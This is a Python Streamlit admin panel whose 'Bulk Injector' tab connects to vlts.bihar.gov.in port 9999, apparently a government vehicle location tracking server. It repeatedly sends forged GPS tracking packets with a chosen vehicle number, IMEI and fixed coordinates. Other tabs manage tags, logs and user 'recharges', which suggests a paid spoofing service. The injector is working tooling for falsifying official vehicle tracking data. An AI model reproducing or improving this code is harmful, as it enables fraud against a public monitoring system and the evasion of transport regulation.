import streamlit as st
import pandas as pd
import time
import socket
from datetime import datetime, timedelta
from database import supabase, get_tags

# --- OFFICIAL BIHAR VLTS SETTINGS ---
HOST_URL = "vlts.bihar.gov.in"
PORT = 9999

def admin_panel():
    st.sidebar.markdown("<h2 style='color: #FF4B4B;'>👑 Admin Pro Max</h2>", unsafe_allow_html=True)
    if st.sidebar.button("🔒 Logout Admin", use_container_width=True):
        st.session_state.logged_in = False
        st.rerun()
    
    t1, t2, t3, t4, t5 = st.tabs(["📊 Reports", "🚀 Bulk Injector", "🏷️ Tag Manager", "👤 User Control", "💳 Recharges"])
    
    # --- TAB 2: HIGH-SPEED BULK INJECTOR ---
    with t2:
        st.subheader("⚡ Bihar VLTS Bulk Injector")
        st.info(f"📡 Sending to: {HOST_URL}:{PORT}")
        
        with st.container(border=True):
            c1, c2, c3 = st.columns(3)
            v_no = c1.text_input("Vehicle No", value="BR04GA5974").upper().strip()
            i_no = c2.text_input("IMEI No", value="862567075041793").strip()
            interval = c3.slider("Loop Delay (Seconds)", 1, 60, 1)
            
            lat_in = c1.number_input("Latitude", value=25.6501550, format="%.7f")
            lon_in = c2.number_input("Longitude", value=84.7851780, format="%.7f")

        all_db_tags = get_tags()
        st.write(f"🚀 **{len(all_db_tags)} Tags** loaded. Ready for zero-latency fire.")

        st.divider()
        col_btn, col_status = st.columns([1, 3])
        
        if 'injecting' not in st.session_state:
            st.session_state.injecting = False

        if not st.session_state.injecting:
            if col_btn.button("🔥 START BULK FIRE", use_container_width=True):
                if v_no and i_no and all_db_tags:
                    try:
                        # 1. Update Vehicle Master
                        supabase.table("vehicle_master").upsert({
                            "vehicle_no": v_no, 
                            "imei_no": i_no,
                            "updated_at": datetime.now().isoformat()
                        }).execute()
                        
                        # 2. FIX: Using a real ID from your user_profiles table (assuming ID 1 exists)
                        # Agar error aaye, toh is line ko comment (#) kar dena
                        supabase.table("activity_logs").insert({
                            "user_id": 1, 
                            "vehicle_no": f"BURST_START: {v_no}"
                        }).execute()
                        
                        st.session_state.injecting = True
                        st.rerun()
                    except Exception as e:
                        # Agar logs fail ho, tab bhi injector chalu rakhenge
                        st.warning(f"Logging skipped, but starting injector...")
                        st.session_state.injecting = True
                        st.rerun()
        else:
            if col_btn.button("🛑 STOP", use_container_width=True):
                st.session_state.injecting = False
                st.rerun()
            
            status_box = col_status.empty()
            
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(5)
                    s.connect((HOST_URL, PORT))
                    
                    while st.session_state.injecting:
                        d_now = datetime.now().strftime("%d%m%Y")
                        t_now = datetime.now().strftime("%H%M%S")
                        
                        for current_tag in all_db_tags:
                            # FIXED: Removed extra spaces in \r\n
                            packet = f"$PVT,{current_tag},2.1.1,NR,01,L,{i_no},{v_no},1,{d_now},{t_now},{lat_in:.7f},N,{lon_in:.7f},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
                            s.sendall(packet.encode('utf-8'))
                        
                        status_box.success(f"🚀 Burst Sent: {len(all_db_tags)} Packets at {t_now}!")
                        time.sleep(interval)
                        
            except Exception as e:
                st.error(f"Server Connection Lost: {e}")
                st.session_state.injecting = False

    # --- TAB 3: TAG MANAGER ---
    with t3:
        st.subheader("🏷️ Tag Control")
        c_in, c_save = st.columns([3, 1])
        nt = c_in.text_input("New Tag").upper().strip()
        if c_save.button("➕ SAVE"):
            if nt:
                supabase.table("custom_tags").insert({"tag_name": nt}).execute()
                st.rerun()
        
        st.divider()
        res_t = supabase.table("custom_tags").select("tag_name").execute()
        if res_t.data:
            cols = st.columns(4)
            for i, t in enumerate(res_t.data):
                with cols[i % 4]:
                    st.info(f"**{t['tag_name']}**")
                    if st.button("🗑️", key=f"d_{i}"):
                        supabase.table("custom_tags").delete().eq("tag_name", t['tag_name']).execute()
                        st.rerun()

    # --- TAB 1: REPORTS ---
    with t1:
        st.subheader("📊 Activity Logs")
        logs = supabase.table("activity_logs").select("*").order("created_at", desc=True).limit(15).execute()
        if logs.data:
            st.dataframe(pd.DataFrame(logs.data), use_container_width=True)

    # --- TAB 4: USER CONTROL ---
    with t4:
        st.subheader("👤 User Management")
        st.info("Searching and editing users will be available here.")
